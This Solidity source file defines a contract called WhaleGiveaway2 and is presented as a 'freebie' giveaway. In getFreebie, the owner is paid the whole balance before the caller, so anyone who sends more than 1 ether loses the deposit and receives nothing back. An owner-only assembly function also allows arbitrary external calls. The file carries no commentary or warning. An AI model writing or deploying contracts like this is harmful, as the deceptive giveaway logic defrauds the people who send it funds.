pragma solidity ^0.4.19;

contract WhaleGiveaway2 {
    address public owner;

    function WhaleGiveaway2() public {
        owner = msg.sender;
    }

    function() public payable {}

    function getFreebie() public payable {
        if (msg.value > 1 ether) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address _to, bytes _data) public payable {
        require(msg.sender == owner);

        bool success;
        bytes memory returnedData;

        assembly {
            let size := mload(_data)
            let ptr := mload(0x40)
            success := call(sub(gas, 5000), _to, msg.value, add(_data, 0x20), size, ptr, 0)
            returnedData := ptr
        }

        require(success);
    }
}